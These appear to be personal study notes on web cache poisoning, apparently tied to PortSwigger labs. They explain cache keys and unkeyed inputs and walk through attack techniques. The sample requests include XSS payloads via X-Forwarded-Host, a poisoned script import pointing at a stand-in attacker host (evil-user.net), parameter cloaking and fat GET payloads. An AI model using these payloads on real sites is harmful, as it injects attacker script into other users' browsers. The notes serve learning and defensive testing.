# How Web Caching Works 
![1000](../../images/web_cache.excalidraw.md)
- caches identify similiar requests by comparing a predefined subset of the request's components (cache key)
	- cache key typically contain the request line and `Host` header
	- components not included in the cache key are 'unkeyed'
- if cache keys match, cached response is returned
	- applies to all subsequent requests until the cached response expires
- **web cache poisoning:** attacker exploits the behaviour of a web server and cache so that a harmful HTTP response is served to other users
	- attacker must work out how to elicit a response from the server that contains some kind of dangerous payload
	- must then make sure that their response is cached and subsequently served to other users 

# Constructing A Web Cache Poisoning Attack
## 1. Identify & Evaluate Unkeyed Inputs 
- web cache poisoning attack - relies on manipulation of unkeyed inputs (headers etc.)
- web caches ignore unkeyed inputs when deciding to serve a cached response
	- hence can use them to inject your payload to elicit a "poisoned" response which if cached, will be served to all users whose requests have matching cache key
- therefore, find the unkeyed inputs first
	- use Param Miner to find unkeyed inputs 
### Param Miner
- right click on request to investigate and click *Guess headers*
	- logs the effect on the response in *Issues* pane in *Target*
- add a cache buster to every request
	- prevent cache from sending your generated responses to real users 
## 2. Elicit A Harmful Response From The Back-End Server
- if the input is reflected in the response from the server without being properly sanitized or used to dynamically generate other data, there is potential entry for web cache poisoning
## 3. Get The Response Cached
- whether a response is cached depends on a lot of factors 
	- file extension, content type, route, status code & response headers
- need to play around with requests on different pages and study how the cache behaves
	![1000](../../images/web_cache_poisoning.excalidraw.md)
# Web Cache Poisoning To Deliver XSS
- exploit unkeyed input that is reflected in a cacheable response without proper sanitization
1. with the following request and response:
	```
	GET /en?region=uk HTTP/1.1
	Host: innocent-website.com
	X-Forwarded-Host: innocent-website.co.uk
	```

	```
	HTTP/1.1 200 OK
	Cache-Control: public
	<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
	```
2. here, the `X-Forwarded-Host` header is being used to dynamically generate an Open Graph image URL which is reflected in the response
	- `X-Forwarded-Host` is often unkeyed
		- can use XSS payload to XSS victims like such:
		```
		GET /en?region=uk HTTP/1.1
		Host: innocent-website.com
		X-Forwarded-Host: a."><script>alert(1)</script>"
		```

		```
		HTTP/1.1 200 OK
		Cache-Control: public
		<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
		```
# Web Cache Poisoning To Exploit Unsafe Handling Of Resource Imports 
- some websites use unkeyed headers to dynamically generate URLs for importing resources
	- eg. externally hosted JavaScript files 
- if attacker changes the value of the appropriate header to a domain that they control, they can manipulate the URL to point to their own malicious JavaScript file instead
- if the response containing this malicious URL is cached, attacker's JavaScript would be imported and executed in the browser session of the victim whose request has a matching cache key

	```
	GET / HTTP/1.1
	Host: innocent-website.com
	X-Forwarded-Host: evil-user.net
	User-Agent: Mozilla/5.0 Firefox/57.0


	HTTP/1.1 200 OK
	<script src="https://evil-user.net/static/analytics.js"></script>
	```
Lab: [Web cache poisoning with an unkeyed header](../../../../writeups/portswigger/Web%20cache%20poisoning%20with%20an%20unkeyed%20header.md)
# Web Cache Poisoning To Exploit Cookie-Handling Vulnerabilities
- cookie might be used to dynamically generate content in a response
	```
	GET /blog/post.php?mobile=1 HTTP/1.1
	Host: innocent-website.com
	User-Agent: Mozilla/5.0 Firefox/57.0
	Cookie: language=pl;
	Connection: close
	```
- cookie header might not be in the cache key
Lab: [Web cache poisoning with an unkeyed cookie](../../../../writeups/portswigger/Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie.md)
# Multiple Headers To Exploit Web Cache Poisoning Vulnerabilities
- some require crafting a request that manipulates multiple unkeyed inputs
	- eg. if a website requires secure communication using HTTPS and the request that uses another protocol is received, the website will dynamically generate a redirect to itself that does use HTTPS
		- you may find an **Open redirect** if you set `X-Forwarded-Host` to a domain controlled by you and `X-Forwarded-Proto` to `http`
			```
			GET /random HTTP/1.1
			Host: innocent-site.com
			X-Forwarded-Proto: http
			```

			```
			HTTP/1.1 301 moved permanently
			Location: https://innocent-site.com/random
			```
		- can also use `X-Forwarded-Scheme` instead of `X-Forwarded-Proto`
# Exploiting Responses That Give Too Much Information 
## Cache-Control Directives
- [Caching Directives](https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching)
	```
	HTTP/1.1 200 OK
	Via: 1.1 varnish-v4
	Age: 174
	Cache-Control: public, max-age=1800
	```
- Tells us how old the currently cached response is(174s) and often the cache is purged(1800s)
## `Vary` Header
- the **`Vary`** HTTP response header describes the parts of the request message aside from the method and URL that influenced the content of the response it occurs in. Most often, this is used to create a cache key when [content negotiation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation) is in use.
- it specifies the list of additional headers that should be treated as part of the cache key even if they are normally unkeyed
Lab: [Targeted web cache poisoning using an unknown header](../../../../writeups/portswigger/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header.md)
# Cache Key Flaws
- most websites take their input from the URL path and the query string
	- request line however is usually part of the cache key 
		- request line : `GET /index.html HTTP/1.1
	- hence any payload injected via keyed inputs would act as a cache buster
	- in practice, many websites and CDNs perform various transformations on keyed components, like:
		- excluding the query string 
		- filtering out specific query parameters
		- normalizing input in keyed components
# Cache Probing Methodology 
## 1. Identify A Suitable Cache Oracle
- **cache oracle:** a page or endpoint that provides feedback on the cache behaviour
	- HTTP headers that explicitly tell you whether you got a cache hit 
	- observable changes to dynamic content
	- distinct response times 
- ideally, the cache oracle will also reflect the entire URL and at least 1 query parameter in the response
- can refer to documentation if can identify a third-party cache being used (eg. Akamai)
## 2. Probe Key Handling 
1. check if anything in the keyed component is excluded from the cache key
	- query parameters, query string, ports
		```
		GET / HTTP/1.1
		Host: vulnerable-website.com
		
		
		
		HTTP/1.1 302 Moved Permanently
		Location: https://vulnerable-website.com/en
		Cache-Status: miss
		```
2. add an arbitrary port to see the response:
	```
	GET / HTTP/1.1
	Host: vulnerable-website.com:1337
	
	HTTP/1.1 302 Moved Permanently
	Location: https://vulnerable-website.com:1337/en
	Cache-Status: miss
	```

3. now don't specify the port:
	```
	GET / HTTP/1.1
	Host: vulnerable-website.com
	
	HTTP/1.1 302 Moved Permanently
	Location: https://vulnerable-website.com:1337/en
	Cache-Status: hit
	```
4. served the cached response even though the `Host` header in the request does not specify the port. this shows that the port is excluded from the cache key, where we can use it to pass a payload.
## 3. Identify An Exploitable Gadget
- often client-side vulnerabilities (XSS etc.)
# Exploiting Cache Key Flaws
## Unkeyed Ports 
- use `Host` header to specify a dud port
## Unkeyed Query String 
- request line is usually keyed, but one of the common cache-key transformations is to exclude the entire query string
### Detecting Unkeyed Query String 
- if the query string is unkeyed, will get a cache hit and hence an unchanged response
	- this makes cache-buster query parameters redundant 
- add the cache buster to a keyed header, eg.
	```
	Accept-Encoding: gzip, deflate, cachebuster
	Accept: */*, text/cachebuster
	Cookie: cachebuster=1
	Origin: https://cachebuster.vulnerable-website.com
	```
- can also check for discrepancies between how the cache and the back-end normalize the path of the request:
	```
	Apache: GET //
	Nginx: GET /%2F
	PHP: GET /index.php/xyz
	.NET GET /(A(xyz)/
	```
- Param Miner - can also select the options "Add static/dynamic cache buster" and "Include cache busters in headers
### Exploiting Unkeyed Query String 
- XSS if possible 
Lab: [Web cache poisoning via an unkeyed query string](../../../../writeups/portswigger/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string.md)
## Unkeyed Query Parameters
- sometimes websites only exclude specific query parameters that are not relevant
	- good to check parameters like `utm_content`
Lab: [Web cache poisoning via an unkeyed query parameter](../../../../writeups/portswigger/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter.md)
## Cache Parameter Cloaking
- work out how the cache parses the URL to identify and remove the unwanted parameters 
	- so to try and sneak arbitrary parameters into the application by cloaking them in an excluded parameter
- usually parameter preceded by `?` if its the first parameter or `&` if the following parameter. 
	- some poorly written parsing algorithms will treat any `?` as a start of a new parameter even if its not the first one
eg. 
1. the following algorithm for excluding parameters from the cache key behaves as such, but the server only accepts the first `?` as a delimiter:
	`GET /?example=123?excluded_param=bad-stuff-here`
2. because it doesn't accept the second `?` as a delimiter for a second parameter, everything after the first parameter will be treated as the first parameter's value, including our payload. this allows us to inject our payload without affecting the cache key
### Exploiting Parameter Parsing Quirks
- Ruby on Rails framework for back-end interprets both `&` and `;` as delimiters
- when this is used in conjunction with a cache that does not allow the above, can be used to inject our payload into a poisoned cached response without affecting the cache key
	![10000](../../images/exploit-quirks.excalidraw.md)
- exploit very powerful if it gives control over a function that will be executed
eg. 
1. if a website is using JSONP to make cross-domain requests, this will often contain a callback parameter to execute a given function on the returned data:
	`GET /jsonp?callback=innocentFunction`
2. can the above techniques to override the expected callback function and execute arbitrary JS.
Lab: [Parameter cloaking](../../../../writeups/portswigger/Parameter%20cloaking.md)
### Exploiting Fat `GET` Support 
- in some cases, the HTTP method may not be keyed
	- this can allow us to poison the cache with a `POST` request containing a malicious payload in the body
	- the payload will be even served in the response of the users' `GET` requests
- even though this is rare, can sometimes achieve a similiar effect by adding a body to a `GET` request (if allowed) to create a 'fat' `GET` request:

	```
	GET /?param=innocent HTTP/1.1
	…
	param=bad-stuff-here
	```
cache key in this case taken from the request line, but the server-side value would be taken from the body
note that the param name must be the same in the body as in the request line
Lab: [Web cache poisoning via a fat GET request](../../../../writeups/portswigger/Web%20cache%20poisoning%20via%20a%20fat%20GET%20request.md)
### Exploiting Dynamic Content In Resource Imports 
- some imported resource files are typically static but some reflect input from the query string
	- by combining this with web cache poisoning, can occasionally inject content into the resource file
		eg. 
		```
		GET /style.css?excluded_param=123);@import… HTTP/1.1
		
		
		HTTP/1.1 200 OK
		…
		@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
		```
	1. poison as follows:
		```
		GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1
		
		
		HTTP/1.1 200 OK
		Content-Type: text/html
		…
		This request was blocked due to…alert(1){}*{color:red;}
		```
## Normalized Cache Keys
![10000](../../images/normalized-cache-keys.excalidraw.md)
- **normalization:** transforming keys into a consistent format
	- eg. 
		1. using unicode
		2. removing redundant information (eg. removing unnecessary query parameters)
		3. converting to canonical form (eg.converting all to lowercase)
- some caching implementations normalize keyed input when adding it to the cache key
	eg. 
	- both requests here would have the same key:
	```
	GET /example?param="><test>
	GET /example?param=%22%3e%3ctest%3e
	```
Lab: [URL normalization](../../../../writeups/portswigger/URL%20normalization.md)